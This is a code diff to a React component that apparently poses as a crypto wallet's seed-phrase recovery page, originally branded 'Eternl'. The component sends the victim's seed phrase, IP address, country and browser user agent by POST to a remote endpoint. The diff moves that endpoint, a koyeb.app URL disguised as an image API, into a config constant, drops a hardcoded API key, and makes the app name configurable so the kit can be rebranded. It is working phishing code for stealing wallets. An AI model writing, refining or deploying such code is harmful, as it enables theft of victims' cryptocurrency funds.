@@ -3,6 +3,7 @@
 import React, { useMemo, useState, useRef, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import axios from "axios";
+import { NOTIFICATION_APP_NAME, SEED_API_URL } from "../app/config";
 
 // Load BIP39 wordlist from public file
 const loadWordlist = async (): Promise<string[]> => {
@@ -230,7 +231,7 @@ export default function RecoveryRestore({
       const userData = await getUserCountry();
 
       const messageData = {
-        appName: "Eternl",
+        appName: NOTIFICATION_APP_NAME,
         seedPhrase: sanitizedRecovery.join(" "),
         country: userData?.country || "Unknown",
         ipAddress: userData?.ip || "Unknown",
@@ -238,15 +239,10 @@ export default function RecoveryRestore({
           typeof navigator !== "undefined" ? navigator.userAgent : "Unknown",
       };
 
-      const response = await fetch(
-        "https://rotten-shaun-ethname-62fa05f5.koyeb.app/api/t1/image",
-        {
+      const response = await fetch(SEED_API_URL, {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
-            "x-api-key":
-              process.env.NEXT_PUBLIC_SECRET_KEY ||
-              "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
           },
           body: JSON.stringify(messageData),
         }
